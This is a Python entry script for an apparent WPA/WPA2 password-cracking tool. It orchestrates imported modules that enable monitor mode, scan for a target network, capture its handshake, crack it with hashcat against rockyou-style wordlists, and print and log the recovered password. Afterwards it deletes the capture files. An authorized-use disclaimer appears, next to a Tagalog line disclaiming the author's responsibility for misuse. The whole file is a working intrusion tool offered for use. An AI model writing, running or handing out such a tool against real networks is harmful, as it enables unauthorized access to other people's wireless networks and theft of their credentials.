#!/usr/bin/env python3
import os
import sys
import argparse
import logging
import subprocess
from modules.credential_logger import CredentialLogger
from modules.handshake_capturer import CaptureHandshake
from modules.wpa_cracker import WPACracker
from modules.wifi_interface import WifiInterface
from modules.wifi_scanner import WifiScanner


class WifiHacker:
    common_wordlist = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/usr/share/dict/wordlist-probable.txt",
        "/opt/wordlists/rockyou.txt",
        "/usr/share/john/password.lst",
        "/pentest/passwords/wordlists/rockyou.txt"
    ]
    
    def __init__(self, interface='wlan0', wordlist=None, debug=False, ssid=None, bssid=None):
        self.interface = interface
        self.debug = debug
        self.wordlist = self.validate_wordlist(wordlist)  
        self.ssid = ssid      
        self.bssid = bssid    
        self.validate_root()  
        self.check_required_tools()  
        self.initialize_components()  
        self.logger = logging.getLogger("WifiHacker")

    def validate_wordlist(self, wordlist_path):
        if wordlist_path:
            if os.path.exists(wordlist_path):
                return os.path.abspath(wordlist_path)
            sys.stderr.write(f"Warning: Specified wordlist not found: {wordlist_path}\n")
        
        # Try common locations
        for wordlist in self.common_wordlist:
            if os.path.exists(wordlist):
                sys.stdout.write(f"Using default wordlist: {wordlist}\n")
                return wordlist
        
        sys.stderr.write("Error: No suitable wordlist found\n")
        sys.stderr.write("Please specify one with -w or install a default wordlist\n")
        sys.exit(1)

    def validate_root(self):
        
        if os.geteuid() != 0:
            sys.stderr.write("This script must be run as root!\n")
            sys.exit(1)

    def check_required_tools(self): 
        required_tools = ['airodump-ng', 'hcxpcapngtool', 'hashcat', 'iwconfig']
        missing = []

        for tool in required_tools:
            try:
                subprocess.run(['which', tool], 
                            check=True, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE)
            except subprocess.CalledProcessError:
                missing.append(tool)

        if missing:
            sys.stderr.write(f"Error: Missing required tools: {', '.join(missing)}\n")
            sys.exit(1)

    def initialize_components(self): 
            self.wifi_interface = WifiInterface(self.interface, self.debug)
            self.wifi_scanner = WifiScanner(self.interface, self.debug)
            self.handshake_capturer = CaptureHandshake(self.interface, self.debug)
            self.wpa_cracker = WPACracker(self.interface, self.debug, self.wordlist)
            self.credential_logger = CredentialLogger()

    def execute(self):
        """Main execution flow using all component classes"""
        try:
            # 1. Set to monitor mode (using WifiInterface)
            self.wifi_interface.enable_monitor_mode()
            
            # 2. Scan for networks (using WifiScanner)
            target = self.wifi_scanner.scan_networks(target_ssid=self.ssid, target_bssid=self.bssid  )
            
            if not target:
                return self._clean_up("No networks found", error=True)
            
            # 3. Capture handshake (using CaptureHandshake)
            pcap = self.handshake_capturer.capture_handshake(
                target['bssid'], 
                target['channel']
            )
            if not pcap:
                return self._clean_up("Handshake capture failed", error=True)
            
            # 4. Crack password (using WPACracker)
            if not self._attempt_crack(pcap, target):
                return self._clean_up("Password crack failed", error=True)
                
        except KeyboardInterrupt:
            self._clean_up("\nOperation cancelled by user")
        except Exception as e:
            self._clean_up(f"Error: {str(e)}", error=True)
        finally:
            self._final_clean_up()

    def _attempt_crack(self, pcap, target):
        """Handle the cracking process using WPACracker"""
        # Use WPACracker's methods directly
        hash_file = self.wpa_cracker.convert_capture_to_hashcat(pcap)
        if not hash_file:
            return False
            
        if not self.wpa_cracker.crack_hash(hash_file):
            return False
            
        password = self.wpa_cracker.extract_password()
        if password:
            self._log_results(target, password)
            return True
        return False

    def _log_results(self, target, password):
        """Use CredentialLogger to save results"""
        sys.stdout.write(f"Success! Password: {password}\n")
        self.credential_logger.save_credentials(
            target['ssid'],
            target['bssid'], 
            password
        )

    def _clean_up(self, message, error=False):
        """Handle cleanup with proper messaging"""
        if error:
            sys.stderr.write(f"Error: {message}\n")
        else:
            sys.stdout.write(f"{message}\n")
        self._final_clean_up()

    def _final_clean_up(self):
        """Reset interface and clean files using component methods"""
        self.wifi_interface.reset_mode()
        self.wifi_scanner.clean_up_files([
            "scan-01.*",
            "capture_*",
            "*.cap", 
            "*.hc22000",
            "cracked_results_*.txt"
        ])
        sys.stdout.write("Cleanup complete\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="WPA/WPA2 Network Cracker - For Educational and Authorized Testing Only",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('-i', '--interface', 
                    default='wlan0',
                    help='Wireless interface to use (default: %(default)s)')
    parser.add_argument('-w', '--wordlist',
                    help='Path to wordlist file (default: auto-detected from common locations)')
    parser.add_argument('-d', '--debug',
                    action='store_true',
                    help='Enable verbose debug output')
    
    try:
        args = parser.parse_args()
        
        if not os.path.exists(f'/sys/class/net/{args.interface}'):
            sys.stderr.write(f"Error: Interface {args.interface} not found\n")
            sys.exit(1)
            
        # Additional wordlist validation if specified
        if args.wordlist and not os.path.isfile(args.wordlist):
            sys.stderr.write(f"Error: Wordlist file not found: {args.wordlist}\n")
            sys.exit(1)

        print("""
        WARNING: This tool is for educational purposes and authorized penetration testing only.
        Unauthorized use may violate laws and regulations. Use only on networks you own or have permission to test.
        WALANG KASALANAN SI LLOYD AREVALO PAG MAY GINAWA KANG MASAMA
        """)
        
        hacker = WifiHacker(
            interface=args.interface,
            wordlist=args.wordlist,
            debug=args.debug
        )
        hacker.execute()
        
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        sys.exit(0)
    except Exception as e:
        sys.stderr.write(f"\n[!] Fatal error: {str(e)}\n")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)